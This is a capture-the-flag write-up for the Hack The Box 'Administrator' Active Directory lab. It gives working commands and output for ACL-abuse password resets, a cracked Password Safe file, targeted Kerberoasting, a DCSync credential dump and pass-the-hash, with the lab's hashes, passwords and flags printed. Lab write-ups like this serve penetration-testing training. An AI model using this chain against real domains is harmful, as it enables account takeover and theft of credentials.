---
machine: Administrator
platform: Hack The Box
category: AD
os: Windows
difficulty: Medium
points: 30
tags: [bloodhound, acl-abuse, password-reset, dcsync, kerberoasting]
date: 2026-05-25
status: retired
summary: "An Active Directory box starting from a foothold credential, exercising BloodHound-driven enumeration and a chain of ACL abuses — delegated password resets, targeted Kerberoasting, and DCSync — to walk outbound object-control rights up to full domain compromise."
---
## Enumeration

nmap scan

```bash
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-11 08:50 -0400
Nmap scan report for 10.129.31.50
Host is up (0.039s latency).
Not shown: 65509 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-05-11 19:51:32Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
53193/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
53198/tcp open  msrpc         Microsoft Windows RPC
53209/tcp open  msrpc         Microsoft Windows RPC
53220/tcp open  msrpc         Microsoft Windows RPC
53253/tcp open  msrpc         Microsoft Windows RPC
61683/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-05-11T19:52:28
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: 7h00m00s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 113.92 seconds

```

## Foothold

We are a Domain User:

```powershell
*Evil-WinRM* PS C:\Users\olivia\Documents> net user Olivia
User name                    olivia
Full Name                    Olivia Johnson
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/5/2024 6:22:48 PM
Password expires             Never
Password changeable          10/6/2024 6:22:48 PM
Password required            No
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Users
The command completed successfully.

```

Domain: `administrator.htb`

We are going to ingest the data into bloodhound now

```bash
└─$ bloodhound-python -u Olivia -p 'ichliebedich' -d administrator.htb -ns 10.129.31.50 -c all                             
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: administrator.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc.administrator.htb:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc.administrator.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.administrator.htb
INFO: Found 11 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.administrator.htb
INFO: Done in 00M 08S
```

After this I opened bloodhound and performed some enumeration with netexec or `nxc` over smb and ldap (didn't find anything too impressive) but I did find the domain user list, which was available on bloodhound anyways.

Our user Olivia is a normal Domain User, only member of Domain Users and Remote Mangement Users, but she has `GenericAll` permissions to Michael, Michael also has the same memberships but has `ForceChangePassword` to Benjamin, Benjamin has no Outbound Object Control but is a member of a strange group "Share Moderators", though this doesn't have any clear permission ties to any more desirable user or group.  We may try to take control of Benjamin from Olivia through Michael and then run bloodhound-python again to see if we get more domain information from being a member of this group.

## Lateral Movement

We change Michael's password from Olivia and then Benjamin's from Michael:

```bash
┌──(kali㉿kali)-[~/htb/administrator]
└─$ net rpc password Michael 'NewPass123!' -U 'administrator.htb/Olivia%ichliebedich' -S 10.129.31.50

┌──(kali㉿kali)-[~/htb/administrator]
└─$ net rpc password Benjamin 'NewPass123!' -U 'administrator.htb/Michael%NewPass123!' -S 10.129.31.50
```

Before running bloodhound-python with these creds im going to check SMB shares as the name Share Moderator may indicate something to do with SMB

SMB shares look identical for Benjamin as Olivia, but if we remember the nmap scan, we have an ftp service running, a service which is notoriously vulnerable and known for sharing files.

```bash
┌──(kali㉿kali)-[~/htb/administrator]
└─$ nxc ftp 10.129.31.50 -u 'Benjamin' -p 'NewPass123!'         
FTP         10.129.31.50    21     10.129.31.50     [+] Benjamin:NewPass123!
```

We find that we can successfully auth to ftp with this cred pair so lets go explore it.

Because ftp, in my opinion is notoriously annoying to enumerate with its hidden directory, I'm going to use this oneliner to recursively copy it locally for me to enumerate, swapping in Benjamin's credentials:

```bash
wget -r --no-passive ftp://anonymous:'anonymous'@10.129.227.77/
```

We find:

```bash
──(kali㉿kali)-[~/htb/administrator/10.129.31.50]
└─$ ls
Backup.psafe3

──(kali㉿kali)-[~/htb/administrator/10.129.31.50]
└─$ file Backup.psafe3                                                                                                                   
Backup.psafe3: Password Safe V3 database
```

Instantly, I look up .psafe3 hashcat and see theres a code `-m 5200` to bruteforce it so I begin running rockyou.txt against it.

It hits with credpair `Backup.psafe3:tekieromucho`

I google how to open .psafe3 files with password and see that you can open it with terminal `pwsafe file.psafe3`, so I install pwsafe and open the file with the appropriate password.

Inside the file we have three Users: `alexander`, `emily`, and `emma` 
From double clicking on the users you can copy their passwords and we find:

```text
alexander:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb
emma:WwANQWnmJnGV07WQN8bMS7FMAbjNur
```

We can go back to bloodhound and see that of these three credpairs emily is a member of `Remote Management Users` meaning we can most likely use this cred pair to evil-winrm into her account.

Surely enough we get the user flag this way:

```powershell
*Evil-WinRM* PS C:\Users\emily\Desktop> dir


    Directory: C:\Users\emily\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        10/30/2024   2:23 PM           2308 Microsoft Edge.lnk
-ar---         5/11/2026  12:39 PM             34 user.txt


*Evil-WinRM* PS C:\Users\emily\Desktop> type user.txt
ea178d1f92d51bfdc8f38ff09595eb8e
```

Going back to bloodhound to assess our new lateral movement abilities with access to these three accounts, we will start with emily since we know we can winrm with her.

She has the same group membership as we have already had (RMU and DU), but she has GenericWrite to Ethan.  This means we can modify attributes of an object except those with special permissions like password resets.

Googling what attacks are associated with GenericWrite abuse I find:

```text
- **User Accounts**: Attacker can add a **Service Principal Name (SPN)** to the target user, enabling a **Kerberoasting** attack to crack the user's password hash offline.  Alternatively, they can abuse **Shadow Credentials** by writing to the `msDS-KeyCredentialLink` attribute to authenticate as the user via PKINIT without knowing the password. 
    
- **Groups**: If a user has GenericWrite on a group (e.g., Domain Admins), they can add themselves or another compromised account to that group, immediately gaining elevated privileges. 
    
- **Computer Accounts**: Similar to users, attackers can use Shadow Credentials to impersonate the computer account or perform **Resource-Based Constrained Delegation (RBCD)** attacks by modifying the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute.
```

We know the second vector won't work as Ethan is a user and not a group, that leaves us with adding a SPN or doing a Shadow Credential Attack.  Im going to try the first attack vector first: [[Targeted Kerberoasting]].

### Targeted Kerberoasting

This involves us adding an arbitrary SPN to the account we want to attack, to make it vulnerable to Kerberoasting.  Im going to use bloodyAD for this with this syntax I found online:

```bash
bloodyAD -d "$DOMAIN" --host "$DC_HOST" -u "$USER" -p "$PASSWORD" set object "$TARGET" servicePrincipalName -v 'http/anything'
```

```bash
──(kali㉿kali)-[~/htb/administrator]
└─$ bloodyAD -d "10.129.31.50" --host "10.129.31.50" -u "emily" -p "UXLCI5iETUsIBoFVTj8yQFKoHjXmb" set object "Ethan" servicePrincipalName -v 'http/anything'
[+] Ethan's servicePrincipalName has been updated
```

Verifying:

```bash
──(kali㉿kali)-[~/htb/administrator]
└─$ GetUserSPNs.py administrator.htb/emily:'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' -dc-ip 10.129.31.50 -request
/usr/local/bin/GetUserSPNs.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.14.0.dev0+20260420.123356.9afc09b9', 'GetUserSPNs.py')
Impacket v0.14.0.dev0+20260420.123356.9afc09b9 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name   MemberOf  PasswordLastSet             LastLogon  Delegation 
--------------------  -----  --------  --------------------------  ---------  ----------
http/anything         ethan            2024-10-12 16:52:14.117811  <never>               
```

Ethan now has a SPN so we can attempt a kerberoast with Impacket's GetUserSPNs.py using emily's creds. (I have alot of trouble with timeskew issues when using netexec for kerberoasting and this command seems to work better) `sudo ntpdate 10.129.31.50 && GetUserSPNs.py administrator.htb/emily:'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' -dc-ip 10.129.31.50 -request -outputfile kerb.txt`:

```bash
──(kali㉿kali)-[~/htb/administrator]
└─$ sudo ntpdate 10.129.31.50 && GetUserSPNs.py administrator.htb/emily:'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' -dc-ip 10.129.31.50 -request -outputfile kerb.txt
2026-05-11 17:31:05.038215 (-0400) +0.002841 +/- 0.019524 10.129.31.50 s1 no-leap
/usr/local/bin/GetUserSPNs.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.14.0.dev0+20260420.123356.9afc09b9', 'GetUserSPNs.py')
Impacket v0.14.0.dev0+20260420.123356.9afc09b9 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name   MemberOf  PasswordLastSet             LastLogon  Delegation 
--------------------  -----  --------  --------------------------  ---------  ----------
http/anything         ethan            2024-10-12 16:52:14.117811  <never>               



[-] CCache file is not found. Skipping...

──(kali㉿kali)-[~/htb/administrator]
└─$ cat kerb.txt       
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$90ca7f7191905bd090022ca171427b71$ad15e2b8aaa6e8b667ca35678035c38318981d72a0986542fdc4bf4b7fbb6bd44a772fff0ae8dff08737b6038d35cb62ad4285c25157dd2624ea24dd93b649effdd16298f9792f141491d5407d6426abd4e012d64bd8254988904a0b25310ead5a56fbd48a6c1f8cb70287bdb480100903d9fe4c449507b2286ec4862f7e8f155c04de798af935ed514b4faa87b2335746af718789ab617c6d8e602f5cfa89c60520a751bdfb029bebdc328ca1ca1e578ecb3f115d19ef78692094d10b8b66f5a6ade238906bf44a25270dfa8fe93ee418f2b67579c19b56aab452f3f87088bc756f336523b51df533ff1d06b8bf97445ab4bbfe080bed391360cf95cd2b0952bdc6ab971a49924ec5073e7e2bedddf21ce393ee25010b7698babf6d953ac251cbf79685782e031c7ddecc6d7fc4fd01def4630759e4f2f4c7951253ce08d3c943164399c3cd5732e71a2e8310103fd074927a0fd721882413bc97271b7460d98ac31bf03556ca1437faf5c296378d80c3157138423532d99f6184671da2817518c686dce4bb99cf97bf0f3fc6b99183ec816635389d9a459cf2091785337840ecf6e704ae6f5e357712209844e68d0e808c7620626c303f6c0d45d11d9f41e6c112693f3796b5fec1c8d4bad43915e062b90fc7c209b5bba1c00cfeb6a1481035f7b263fd0fc24c392de70edea89ac59a55c49f1550f0fe7efd8c464da7c10beaae794a4956e3feab76df34d0a92de22c9adac928947051ea02cde1992de440a4f03d1f4c1ca8343a01972b4a2906f58f1cf29d53f4ff5381b7611ef131b6f01cb30b0c95f5e8a7d39d307fe305376225a1a02547deeca574b1ef5c501943f20a8ad4c95576fe8ffe84130c5c9323880e43c9a510ccc9d7cca6b3252d965e203ddac05005b08a0482daebefdd8b474da5305df6d0a09b15783fa9208a6513e78e9164b13c55341c126bf91c1e0b57fefd70c0a1c2977ede53ed2dcf3dda732b018ff94664c74c8a9d5574bc584e84f2bb450cc9ab271521922b85409e46bdcda09eb0047ba888306b4e2b35a1b44ffbe24c3b9dd576b26d64eb8922c9a53b4ba772ea0f7e3af3f1d505742fdfd0ebbbbfdfc9574982e5e10aef4f5df5478bf768250168a3e0590a245f95bf0cec6a9dec9c711aafe31ede1530df40c8259e7724968fe202876c372b5dd42228fef0e1683b710179d6e284e23800f4705b6964dff9358d3405dd84e1edaf0ead1e2ed6d4e87300d56b7c3c4c8de004b073ec8961af0813d74f8560330abbde9b3c0340885474a98beb9223e7eaeb47123878eb45891feb2e6521286bdb24895eca273b294e00b5d81a69f1de6a986168de21fc508235e4c1acaa0d0449786bcc2e7ccc959e4b136c1d2e1a190c76aeab6f8244d799782c6c7d4875337de9c1cb07c55dc2f031a0629c7a41f12ea4463672d6b9d7716905aac158c6bd1dcd129289d852d9187c8d7e779197453c5dcd723293db6f1bd088a121bcc345195bff4b831ea25c9bb21e421c0f5d453259b4141a2d
```

Now we attempt to crack kerb.txt with mode 13100:
It hits with credpair: `ethan:limpbizkit`

## Privilege Escalation

### DCSync

Ethan is only a Domain User but he has Outbound Object Control permissions to the AD Machine: ADMINISTRATOR.HTB.  He has:
`GetChanges`, `GetChangesInFilteredSet`, `GetChangesAll` to the domain machine.

Google searching these permissions we can find:

```text
Abusing these Active Directory rights allows attackers to perform **DCSync** or **SyncLAPSPassword** attacks to extract password hashes or local administrator passwords without direct access to Domain Controllers.
```

The requirements for DCSync (an incredibly popular domain compromise technique) are:
- `GetChanges`
- `GetChangesAll`

We would have both of these permissions by compromising Ethan and the DCSync attack can be performed by Mimikatz with `lsadump::dcsync` or Impacket's secretsdump.py, I typically prefer secretsdump so thats what I am going to use.

```bash
──(kali㉿kali)-[~/htb/administrator]
└─$ secretsdump.py administrator.htb/ethan:'limpbizkit'@10.129.31.50                                                                               
/usr/local/bin/secretsdump.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.14.0.dev0+20260420.123356.9afc09b9', 'secretsdump.py')
Impacket v0.14.0.dev0+20260420.123356.9afc09b9 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::
administrator.htb\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::
administrator.htb\michael:1109:aad3b435b51404eeaad3b435b51404ee:25451b15eeabfa492d9a18442a6e914b:::
administrator.htb\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:25451b15eeabfa492d9a18442a6e914b:::
administrator.htb\emily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31:::
administrator.htb\ethan:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884:::
administrator.htb\alexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199:::
administrator.htb\emma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:9d453509ca9b7bec02ea8c2161d2d340fd94bf30cc7e52cb94853a04e9e69664
Administrator:aes128-cts-hmac-sha1-96:08b0633a8dd5f1d6cbea29014caea5a2
Administrator:des-cbc-md5:403286f7cdf18385
krbtgt:aes256-cts-hmac-sha1-96:920ce354811a517c703a217ddca0175411d4a3c0880c359b2fdc1a494fb13648
krbtgt:aes128-cts-hmac-sha1-96:aadb89e07c87bcaf9c540940fab4af94
krbtgt:des-cbc-md5:2c0bc7d0250dbfc7
administrator.htb\olivia:aes256-cts-hmac-sha1-96:713f215fa5cc408ee5ba000e178f9d8ac220d68d294b077cb03aecc5f4c4e4f3
administrator.htb\olivia:aes128-cts-hmac-sha1-96:3d15ec169119d785a0ca2997f5d2aa48
administrator.htb\olivia:des-cbc-md5:bc2a4a7929c198e9
administrator.htb\michael:aes256-cts-hmac-sha1-96:615a7b6664f0bfc7160e1d3cfe1ca134ffdacaa656ccddd7167aa283c8b211e0
administrator.htb\michael:aes128-cts-hmac-sha1-96:4374c22e248e847055a39bd1d18cf90b
administrator.htb\michael:des-cbc-md5:cbcb10e05210bc51
administrator.htb\benjamin:aes256-cts-hmac-sha1-96:3e2ad3748befe7d37e09d531f546a4378a9a5c3fc896847967cb809be66de907
administrator.htb\benjamin:aes128-cts-hmac-sha1-96:ac2859f4e518f43820a2f739409087af
administrator.htb\benjamin:des-cbc-md5:5dc4f43b1a792cce
administrator.htb\emily:aes256-cts-hmac-sha1-96:53063129cd0e59d79b83025fbb4cf89b975a961f996c26cdedc8c6991e92b7c4
administrator.htb\emily:aes128-cts-hmac-sha1-96:fb2a594e5ff3a289fac7a27bbb328218
administrator.htb\emily:des-cbc-md5:804343fb6e0dbc51
administrator.htb\ethan:aes256-cts-hmac-sha1-96:e8577755add681a799a8f9fbcddecc4c3a3296329512bdae2454b6641bd3270f
administrator.htb\ethan:aes128-cts-hmac-sha1-96:e67d5744a884d8b137040d9ec3c6b49f
administrator.htb\ethan:des-cbc-md5:58387aef9d6754fb
administrator.htb\alexander:aes256-cts-hmac-sha1-96:b78d0aa466f36903311913f9caa7ef9cff55a2d9f450325b2fb390fbebdb50b6
administrator.htb\alexander:aes128-cts-hmac-sha1-96:ac291386e48626f32ecfb87871cdeade
administrator.htb\alexander:des-cbc-md5:49ba9dcb6d07d0bf
administrator.htb\emma:aes256-cts-hmac-sha1-96:951a211a757b8ea8f566e5f3a7b42122727d014cb13777c7784a7d605a89ff82
administrator.htb\emma:aes128-cts-hmac-sha1-96:aa24ed627234fb9c520240ceef84cd5e
administrator.htb\emma:des-cbc-md5:3249fba89813ef5d
DC$:aes256-cts-hmac-sha1-96:98ef91c128122134296e67e713b233697cd313ae864b1f26ac1b8bc4ec1b4ccb
DC$:aes128-cts-hmac-sha1-96:7068a4761df2f6c760ad9018c8bd206d
DC$:des-cbc-md5:f483547c4325492a
[*] Cleaning up... 
```

And there we have a successful DCSync dump - utilized DRSUAPI replication protocol to pull hashes from NTDS.dit without touching the disk.  Now lets pass the administrator hash to get Domain Admin privileges and check the desktop for a flag.

```bash
──(kali㉿kali)-[~/htb/administrator]
└─$ evil-winrm -i 10.129.31.50 -u administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> dir ../Desktop


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-ar---         5/11/2026  12:39 PM             34 root.txt


*Evil-WinRM* PS C:\Users\Administrator\Documents> type ../Desktop/root.txt
e46eeb5811526ee3ab35f6c085bb79a2
```
